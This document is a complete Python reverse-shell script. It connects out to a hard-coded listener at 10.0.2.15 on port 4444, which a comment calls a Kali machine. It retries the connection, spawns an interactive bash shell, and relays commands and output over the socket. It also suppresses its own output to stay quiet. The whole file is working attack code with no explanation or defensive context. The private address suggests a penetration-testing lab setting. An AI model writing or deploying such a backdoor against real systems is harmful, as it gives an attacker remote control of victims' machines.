#!/usr/bin/env python3
import socket
import os
import subprocess
import sys
import time
import select

# Configuration
HOST = "10.0.2.15"  # Kali machine IP
PORT = 4444        # Listening port
BUFFER_SIZE = 4096 # Buffer size for data transfer
RETRY_DELAY = 5    # Seconds between retries
MAX_RETRIES = 5    # Maximum connection attempts
TIMEOUT = 5        # Socket timeout in seconds

def connect():
    s = None
    shell = None
    try:
        # Create and configure socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)

        # Attempt connection with retries
        for attempt in range(MAX_RETRIES):
            try:
                s.connect((HOST, PORT))
                break
            except (ConnectionRefusedError, socket.timeout):
                if attempt == MAX_RETRIES - 1:
                    return
                time.sleep(RETRY_DELAY)

        # Configure environment
        env = os.environ.copy()
        env['TERM'] = 'xterm'

        # Start interactive bash shell
        shell = subprocess.Popen(
            ['/bin/bash', '-i'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            text=False
        )

        # Set non-blocking mode for shell streams
        for stream in [shell.stdout, shell.stderr]:
            os.set_blocking(stream.fileno(), False)

        # Main data relay loop
        while True:
            readable, _, _ = select.select([s, shell.stdout, shell.stderr], [], [], 1.0)

            # Handle incoming commands from socket
            if s in readable:
                command = s.recv(BUFFER_SIZE)
                if not command:
                    break
                shell.stdin.write(command)
                shell.stdin.flush()

            # Handle shell output
            output = b""
            for stream in [shell.stdout, shell.stderr]:
                if stream in readable:
                    chunk = stream.read(BUFFER_SIZE)
                    if chunk:
                        output += chunk

            # Send output to socket
            if output:
                s.sendall(output)

            # Check if shell has terminated
            if shell.poll() is not None:
                break

    except (ConnectionResetError, BrokenPipeError, socket.error):
        pass
    finally:
        # Cleanup resources
        if shell:
            try:
                shell.terminate()
                shell.wait(timeout=1)
            except:
                shell.kill()
        if s:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    # Suppress output when running as main
    with open(os.devnull, 'w') as devnull:
        sys.stdout = devnull
        sys.stderr = devnull
        connect()
